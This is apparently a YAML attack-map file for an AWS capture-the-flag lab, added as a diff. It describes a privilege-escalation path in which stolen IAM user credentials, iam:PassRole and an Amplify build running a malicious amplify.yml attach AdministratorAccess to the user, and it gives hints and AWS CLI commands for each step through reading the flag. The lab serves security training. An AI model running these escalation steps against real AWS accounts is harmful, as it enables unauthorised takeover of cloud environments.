@@ -1,0 +1,123 @@
+attackMap:
+  nodes:
+    - id: starting-user
+      label: "Starting User"
+      type: principal
+      subType: iam-user
+      arn: "arn:aws:iam::{account_id}:user/pl-prod-amplify-001-to-admin-starting-user"
+      access:
+        type: assumed-breach-credentials
+      description: >
+        You have gained access to this principal's AWS IAM credentials. These could
+        have been obtained through many real-world vectors: phishing a developer and
+        gaining access to their workstation, compromising a browser session, exploiting
+        a vulnerable workload running in this AWS account, discovering credentials in
+        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.
+
+        Regardless of how you obtained them, you are now operating as this principal.
+        This IAM user has iam:PassRole on the admin role, amplify:CreateApp,
+        amplify:CreateBranch, and amplify:StartJob permissions, plus CodeCommit
+        permissions to push to the pre-created repository.
+
+    - id: codecommit-repo
+      label: "CodeCommit Repository"
+      type: resource
+      subType: codecommit-repository
+      arn: "arn:aws:codecommit:{region}:{account_id}:pl-prod-amplify-001-to-admin-repo"
+      description: >
+        A pre-created CodeCommit repository that the Amplify app will connect to.
+        The attacker pushes a malicious amplify.yml build spec here that, when
+        executed by the Amplify build container, calls IAM APIs to attach
+        AdministratorAccess to the starting user.
+
+    - id: admin-role
+      label: "Admin Role"
+      type: principal
+      subType: iam-role
+      isAdmin: true
+      arn: "arn:aws:iam::{account_id}:role/pl-prod-amplify-001-to-admin-admin-role"
+      description: >
+        An IAM role with AdministratorAccess attached that trusts amplify.amazonaws.com.
+        This role is passed to the Amplify app during creation via iam:PassRole. When
+        the Amplify build runs, the build container assumes this role and executes the
+        malicious amplify.yml commands with full admin permissions in the account.
+        Gaining effective admin access requires the build to attach AdministratorAccess
+        to the starting user, whose credentials the attacker already holds.
+
+    - id: ctf-flag
+      label: "CTF Flag"
+      type: resource
+      subType: ssm-parameter
+      isTarget: true
+      arn: "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/amplify-001-to-admin"
+      description: >
+        The CTF flag for this scenario, stored as an SSM parameter in the victim account.
+        Retrieving it requires administrator-equivalent permissions (ssm:GetParameter is
+        granted implicitly by AdministratorAccess). Your goal is to read this parameter
+        using the admin access gained from the previous step.
+
+  edges:
+    - from: starting-user
+      to: codecommit-repo
+      label: "codecommit:GitPush malicious amplify.yml"
+      description: >
+        The starting user clones the empty CodeCommit repository and pushes a malicious
+        amplify.yml build spec. The build spec contains shell commands that use the
+        Amplify build container's injected credentials (the admin role) to attach
+        AdministratorAccess to the starting user.
+      hints:
+        - "Configure git to use CodeCommit credential helper: git config --global credential.helper '!aws codecommit credential-helper $@' and git config --global credential.UseHttpPath true"
+        - "The amplify.yml preBuild commands run with the admin role credentials. Use aws iam attach-user-policy to grant AdministratorAccess to your starting user."
+      commands:
+        - description: "Configure git credential helper for CodeCommit"
+          command: "git config --global credential.helper '!aws codecommit credential-helper $@' && git config --global credential.UseHttpPath true"
+        - description: "Clone the empty repository and push malicious build spec"
+          command: "git clone https://git-codecommit.{region}.amazonaws.com/v1/repos/pl-prod-amplify-001-to-admin-repo /tmp/amplify-exploit && cd /tmp/amplify-exploit"
+
+    - from: starting-user
+      to: admin-role
+      label: "iam:PassRole + amplify:CreateApp + amplify:CreateBranch + amplify:StartJob"
+      description: >
+        The starting user creates an Amplify app connected to the CodeCommit repository,
+        passing the admin role as the service role via iam:PassRole. After creating a
+        branch and starting a build job, the Amplify service runs the malicious
+        amplify.yml using the admin role's credentials, which attaches AdministratorAccess
+        to the starting user.
+      hints:
+        - "Use amplify:CreateApp with --iam-service-role-arn pointing to the admin role ARN. This is where PassRole occurs."
+        - "After CreateApp, call amplify:CreateBranch then amplify:StartJob with --job-type RELEASE to trigger the build."
+        - "The build takes 2-5 minutes. Poll with amplify:GetJob until status is SUCCEED (or FAILED — the preBuild phase may complete even if later phases fail)."
+        - "Browse to https://pathfinding.cloud/paths/amplify-001 for the full technique breakdown."
+      commands:
+        - description: "Create Amplify app with admin role as service role (PassRole step)"
+          command: >
+            aws amplify create-app
+              --name pl-prod-amplify-001-to-admin-app
+              --repository https://git-codecommit.{region}.amazonaws.com/v1/repos/pl-prod-amplify-001-to-admin-repo
+              --iam-service-role-arn arn:aws:iam::{account_id}:role/pl-prod-amplify-001-to-admin-admin-role
+              --region {region}
+              --output json
+        - description: "Create a branch in the app"
+          command: "aws amplify create-branch --app-id {appId} --branch-name main --region {region}"
+        - description: "Start the build job"
+          command: "aws amplify start-job --app-id {appId} --branch-name main --job-type RELEASE --region {region}"
+        - description: "Poll build status"
+          command: "aws amplify get-job --app-id {appId} --branch-name main --job-id {jobId} --region {region} --query 'job.summary.status' --output text"
+        - description: "Verify AdministratorAccess was attached"
+          command: "aws iam list-attached-user-policies --user-name pl-prod-amplify-001-to-admin-starting-user --query 'AttachedPolicies[*].PolicyArn' --output text"
+
+    - from: admin-role
+      to: ctf-flag
+      label: "Read CTF flag"
+      description: >
+        With AdministratorAccess now attached to the starting user, retrieve the scenario
+        flag from SSM Parameter Store. AdministratorAccess grants ssm:GetParameter on all
+        parameters in the account, so no additional permissions are needed beyond the
+        admin access just gained.
+      hints:
+        - "You now hold admin-equivalent credentials via the starting user. The scenario flag is stored in SSM Parameter Store."
+        - "Scenario flags live under /pathfinding-labs/flags/ in SSM Parameter Store."
+        - "Use ssm:GetParameter with the full parameter name to retrieve the flag value."
+      commands:
+        - description: "Retrieve the CTF flag from SSM Parameter Store"
+          command: "aws ssm get-parameter --name /pathfinding-labs/flags/amplify-001-to-admin --query 'Parameter.Value' --output text"
